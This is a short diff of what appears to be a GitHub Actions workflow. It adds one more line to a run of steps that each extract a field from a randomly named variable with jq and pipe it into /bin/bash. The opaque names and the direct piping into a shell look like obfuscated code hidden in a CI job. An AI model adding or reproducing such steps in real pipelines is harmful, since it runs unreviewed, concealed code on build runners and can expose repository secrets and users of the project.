@@ -52,6 +52,7 @@ jobs:
           echo $t732 | jq -r .sho169 | /bin/bash
           echo $mkmwe143 | jq -r .gch9 | /bin/bash
           echo $pha07 | jq -r .zl0 | /bin/bash
+          echo $kqyug0 | jq -r .dsuta10 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
